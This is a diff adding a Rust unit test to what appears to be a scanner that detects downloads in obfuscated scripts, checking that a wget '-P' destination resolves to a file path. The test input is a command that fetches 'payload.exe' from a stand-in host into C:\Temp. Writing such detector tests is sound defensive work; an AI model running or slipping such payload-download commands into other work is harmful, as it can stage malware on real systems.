@@ -11372,6 +11372,27 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
     }
 
     #[test]
+    fn wget_attached_output_prefix_resolves_to_downloaded_filename() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget https://wget-attached-prefix.example/payload.exe -PC:\Temp"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-attached-prefix.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.exe")
+            )
+        });
+        assert!(
+            has,
+            "wget -PDEST destination was not resolved to the file path: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn wget_directory_prefix_resolves_to_downloaded_filename() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
